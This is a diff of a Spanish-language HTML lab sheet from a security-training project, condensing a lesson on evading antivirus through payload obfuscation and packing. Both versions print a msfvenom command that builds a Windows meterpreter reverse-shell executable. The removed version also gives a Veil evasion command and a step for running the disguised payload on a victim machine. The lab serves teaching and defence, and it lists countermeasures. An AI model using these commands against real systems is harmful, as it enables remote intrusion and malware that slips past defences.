@@ -35,186 +35,171 @@
     }
   </style>
 </head>
+
 <body>
 
-  <h1>Lab 24 – Evasión de antivirus mediante ofuscación de payloads y técnicas de empaquetado</h1>
-  <h2>Transformación de binarios maliciosos para evitar detección por motores antivirus tradicionales</h2>
+<h1>Lab 24 – Evasión de antivirus mediante ofuscación de payloads y técnicas de empaquetado</h1>
+<p class="subtitulo">Transformación de binarios maliciosos para evitar detección por motores antivirus tradicionales</p>
 
-  <section>
-    <h2>1. Objetivo</h2>
-    <p>Este laboratorio permite al analista ofensivo comprender cómo los motores antivirus detectan amenazas y cómo pueden ser evadidos mediante técnicas de ofuscación, cifrado y empaquetado. Se exploran herramientas que modifican la firma de un payload sin alterar su funcionalidad, permitiendo su ejecución en entornos protegidos. El objetivo es evaluar la eficacia de los antivirus y reforzar la detección basada en comportamiento.</p>
-  </section>
+<section>
+  <h2>Objetivo</h2>
+  <p>Comprender cómo los motores antivirus detectan amenazas y cómo pueden ser evadidos mediante técnicas de ofuscación, cifrado y empaquetado, evaluando la eficacia defensiva basada en firmas y comportamiento.</p>
+</section>
 
-  <section>
-    <h2>2. Nivel de dificultad</h2>
-    <p>Avanzado</p>
-  </section>
+<section>
+  <h2>Nivel de dificultad</h2>
+  <p>Avanzado</p>
+</section>
 
-  <section>
-    <h2>3. Herramientas utilizadas</h2>
-    <ul>
-      <li><code>msfvenom</code></li>
-      <li><code>Veil</code></li>
-      <li><code>Shellter</code></li>
-      <li><code>PEStudio</code></li>
-      <li><code>VirusTotal</code> (solo para análisis, no para subir malware real)</li>
-    </ul>
-  </section>
+<section>
+  <h2>Herramientas utilizadas</h2>
+  <ul>
+    <li>msfvenom</li>
+    <li>Veil</li>
+    <li>Shellter</li>
+    <li>PEStudio</li>
+    <li>VirusTotal (solo análisis teórico)</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>4. Entorno de laboratorio</h2>
-    <p>Máquina atacante con Kali Linux, máquina víctima con antivirus activo (Windows Defender o similar), red virtual controlada, snapshot de restauración.</p>
-  </section>
+<section>
+  <h2>Entorno de laboratorio</h2>
+  <p>Kali Linux como atacante, Windows con antivirus activo como víctima, red virtual aislada y snapshots de restauración.</p>
+</section>
 
-  <section>
-    <h2>5. Escenario</h2>
-    <p>Un analista ofensivo necesita ejecutar un payload en una máquina protegida por antivirus. El objetivo es modificar el binario para evadir la detección, sin alterar su funcionalidad, y evaluar la respuesta del sistema defensivo.</p>
-  </section>
+<section>
+  <h2>Escenario</h2>
+  <p>Un analista ofensivo necesita ejecutar un payload en un sistema protegido por antivirus, evaluando técnicas para evadir la detección sin modificar la funcionalidad.</p>
+</section>
 
-  <section>
-    <h2>6. Pasos previos</h2>
-    <ul>
-      <li>Generar un payload con <code>msfvenom</code> en formato <code>.exe</code></li>
-      <li>Verificar que el antivirus detecta el binario original</li>
-      <li>Instalar y configurar Veil y Shellter en Kali</li>
-      <li>Preparar entorno de análisis con PEStudio y sandbox</li>
-    </ul>
-  </section>
+<section>
+  <h2>Pasos previos</h2>
+  <ul>
+    <li>Generar payload base con msfvenom</li>
+    <li>Confirmar detección inicial por antivirus</li>
+    <li>Instalar Veil y Shellter</li>
+    <li>Preparar entorno de análisis estático</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>7. Desarrollo</h2>
-    <ol>
-      <li>Generar payload con <code>msfvenom</code>:
-        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</code></pre>
-      </li>
-      <li>Analizar el binario con PEStudio y comprobar detección en VirusTotal (sin subirlo si es real)</li>
-      <li>Ofuscar el payload con Veil:
-        <pre><code>veil -t Evasion -p windows/meterpreter/reverse_tcp --ip 192.168.1.100 --port 4444</code></pre>
-      </li>
-      <li>Empaquetar el binario con Shellter en modo automático</li>
-      <li>Comparar detección antes y después de la ofuscación</li>
-      <li>Ejecutar en máquina víctima y observar comportamiento del antivirus</li>
-    </ol>
-  </section>
+<section>
+  <h2>Desarrollo</h2>
+  <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</code></pre>
+  <p>Aplicar ofuscación, empaquetado y comparar resultados antes y después.</p>
+</section>
 
-    <section>
-    <h2>8. Resultados esperados</h2>
-    <ul>
-      <li>Detección del payload original por el antivirus</li>
-      <li>Reducción de detección tras aplicar técnicas de ofuscación</li>
-      <li>Ejecución exitosa del payload en la máquina víctima</li>
-      <li>Comparación entre firmas antes y después de la transformación</li>
-    </ul>
-  </section>
+<section>
+  <h2>Resultados esperados</h2>
+  <ul>
+    <li>Payload original detectado</li>
+    <li>Payload ofuscado con menor detección</li>
+    <li>Ejecución funcional tras evasión</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>9. Análisis de resultados</h2>
-    <p>Los antivirus tradicionales se basan en firmas estáticas y heurísticas. Al modificar la estructura del binario sin alterar su funcionalidad, se puede evitar la detección. La comparación entre el comportamiento del antivirus ante el payload original y el ofuscado permite evaluar la eficacia de las técnicas evasivas.</p>
-  </section>
+<section>
+  <h2>Análisis de resultados</h2>
+  <p>Las modificaciones estructurales del binario alteran las firmas estáticas, reduciendo la efectividad de detección tradicional.</p>
+</section>
 
-  <section>
-    <h2>10. Conclusiones</h2>
-    <p>La evasión de antivirus es posible mediante técnicas de ofuscación y empaquetado. Sin embargo, estas técnicas deben usarse con responsabilidad y únicamente en entornos controlados. La detección basada en comportamiento y análisis dinámico es más efectiva que las firmas estáticas.</p>
-  </section>
+<section>
+  <h2>Conclusiones</h2>
+  <p>La evasión de antivirus es viable, pero refuerza la necesidad de defensas basadas en comportamiento y análisis dinámico.</p>
+</section>
 
-  <section>
-    <h2>11. Medidas</h2>
-    <ul>
-      <li>Registrar detección del payload original y del ofuscado</li>
-      <li>Comparar hashes, firmas y comportamiento en ejecución</li>
-      <li>Documentar herramientas y parámetros utilizados</li>
-    </ul>
-  </section>
+<section>
+  <h2>Medidas</h2>
+  <ul>
+    <li>Documentar hashes y firmas</li>
+    <li>Comparar detección antes y después</li>
+    <li>Registrar parámetros utilizados</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>12. Contramedidas</h2>
-    <ul>
-      <li>Implementar análisis dinámico y sandboxing</li>
-      <li>Actualizar motores antivirus y reglas heurísticas</li>
-      <li>Aplicar listas blancas de aplicaciones firmadas</li>
-      <li>Correlacionar eventos en SIEM para detectar ejecución anómala</li>
-    </ul>
-  </section>
+<section>
+  <h2>Contramedidas</h2>
+  <ul>
+    <li>Sandboxing</li>
+    <li>Análisis heurístico</li>
+    <li>Correlación en SIEM</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>13. Riesgos y advertencias</h2>
-    <p>El uso de payloads ofuscados puede activar mecanismos de defensa avanzados o generar falsos negativos. Este laboratorio debe ejecutarse únicamente en entornos controlados. No subir binarios reales a VirusTotal ni ejecutarlos en sistemas de producción.</p>
-  </section>
+<section>
+  <h2>Riesgos y advertencias</h2>
+  <p>Ejecutar únicamente en entornos controlados. No usar payloads reales en sistemas productivos.</p>
+</section>
 
-  <section>
-    <h2>14. Evidencias</h2>
-    <p><em>Espacio reservado para capturas de pantalla de PEStudio, Veil, Shellter, análisis de firmas y comportamiento del antivirus.</em></p>
-  </section>
+<section>
+  <h2>Evidencias</h2>
+  <p>Espacio reservado para capturas, logs y análisis.</p>
+</section>
 
-  <section>
-    <h2>15. Validación cruzada</h2>
-    <ul>
-      <li><a href="https://attack.mitre.org/techniques/T1027/" target="_blank">MITRE ATT&CK T1027 – Obfuscated Files or Information</a></li>
-      <li><a href="https://www.cisecurity.org/controls/malware-defenses" target="_blank">CIS Control 10 – Malware Defenses</a></li>
-      <li><a href="https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final" target="_blank">NIST SP 800-83 – Guide to Malware Incident Prevention and Handling</a></li>
-    </ul>
-  </section>
+<section>
+  <h2>Validación cruzada</h2>
+  <ul>
+    <li>MITRE ATT&CK T1027</li>
+    <li>CIS Control 10</li>
+    <li>NIST SP 800-83</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>16. Glosario asociado</h2>
-    <ul>
-      <li><strong>Ofuscación:</strong> Técnica para alterar la apariencia de un código o binario sin cambiar su funcionalidad</li>
-      <li><strong>Empaquetado:</strong> Proceso de encapsular un ejecutable para modificar su firma</li>
-      <li><strong>Sandbox:</strong> Entorno controlado para ejecutar código sospechoso sin riesgo</li>
-      <li><strong>Heurística:</strong> Técnica de detección basada en comportamiento o patrones sospechosos</li>
-      <li><strong>Payload:</strong> Carga útil que ejecuta una acción específica, como una shell reversa</li>
-    </ul>
-  </section>
+<section>
+  <h2>Glosario asociado</h2>
+  <ul>
+    <li>Ofuscación</li>
+    <li>Empaquetado</li>
+    <li>Sandbox</li>
+    <li>Payload</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>17. Preguntas de refuerzo</h2>
-    <ol>
-      <li>¿Qué diferencia hay entre detección por firma y por comportamiento?</li>
-      <li>¿Qué técnicas permiten modificar la firma de un binario?</li>
-      <li>¿Qué riesgos implica subir un payload real a VirusTotal?</li>
-      <li>¿Cómo puede un sandbox ayudar a detectar malware ofuscado?</li>
-      <li>¿Qué herramientas permiten empaquetar un ejecutable sin alterar su funcionalidad?</li>
-    </ol>
-  </section>
+<section>
+  <h2>Preguntas de refuerzo</h2>
+  <ul>
+    <li>Diferencia entre firma y comportamiento</li>
+    <li>Riesgos de VirusTotal</li>
+    <li>Ventajas del sandbox</li>
+  </ul>
+</section>
 
-    <section>
-    <h2>18. Rúbrica de evaluación</h2>
-    <ul>
-      <li>✔️ Ejecuta correctamente técnicas de ofuscación y empaquetado</li>
-      <li>✔️ Evalúa la respuesta del antivirus ante cada variante</li>
-      <li>✔️ Relaciona técnicas con estándares y certificaciones</li>
-      <li>✔️ Aplica medidas y contramedidas con criterio técnico</li>
-    </ul>
-  </section>
+<section>
+  <h2>Rúbrica de evaluación</h2>
+  <ul>
+    <li>Ejecución correcta</li>
+    <li>Análisis técnico</li>
+    <li>Aplicación de contramedidas</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>19. Recursos complementarios</h2>
-    <ul>
-      <li><a href="https://www.veil-framework.com/" target="_blank">Veil Framework</a></li>
-      <li><a href="https://www.shellterproject.com/" target="_blank">Shellter – Dynamic Shellcode Injection</a></li>
-      <li><a href="https://www.winitor.com/pestudio/" target="_blank">PEStudio – Malware Analysis Tool</a></li>
-      <li><a href="https://www.virustotal.com/" target="_blank">VirusTotal – Online Malware Scanner</a></li>
-    </ul>
-  </section>
+<section>
+  <h2>Recursos complementarios</h2>
+  <ul>
+    <li>Veil Framework</li>
+    <li>Shellter</li>
+    <li>PEStudio</li>
+  </ul>
+</section>
 
-  <section>
-    <h2>20. Créditos y licencia</h2>
-    <p>Este laboratorio forma parte del proyecto <a href="https://pergamino-digital-ciberseguridad.blogspot.com/?m=1" target="_blank">El Pergamino Digital</a>. Su uso está autorizado únicamente con fines educativos, respetando la trazabilidad editorial y la licencia CC BY-NC-SA 4.0.</p>
-  </section>
+<section>
+  <h2>Créditos y licencia</h2>
+  <p>Proyecto El Pergamino Digital – CC BY-NC-SA 4.0</p>
+</section>
 
-  <section>
-    <h2>21. Nivel de certificación</h2>
-    <p>Avanzado – Alineado con OSCP, CRTO y eCPTXv2.</p>
-  </section>
+<section>
+  <h2>Nivel de certificación</h2>
+  <p>Avanzado – OSCP / eCPTXv2</p>
+</section>
 
-  <section>
-    <h2>22. Mapa de integración</h2>
-    <ul>
-      <li>🔗 Continúa el enfoque del <strong>Lab 23</strong> (Bypass de WAF y evasión avanzada)</li>
-      <li>🧪 Refuerza el dominio de evasión en capa de endpoint y análisis de firmas</li>
-      <li>🎓 Integra conceptos clave del simulador certificador: <em>Payload Obfuscation</em>, <em>AV Evasion</em>, <em>Binary Repacking</em></li>
-    </ul>
-  </section>
+<section>
+  <h2>Mapa de integración</h2>
+  <ul>
+    <li>Continúa Lab 23</li>
+    <li>Refuerza evasión en endpoint</li>
+    <li>Integra simulador certificador</li>
+  </ul>
+</section>
 
 </body>
 </html>
+
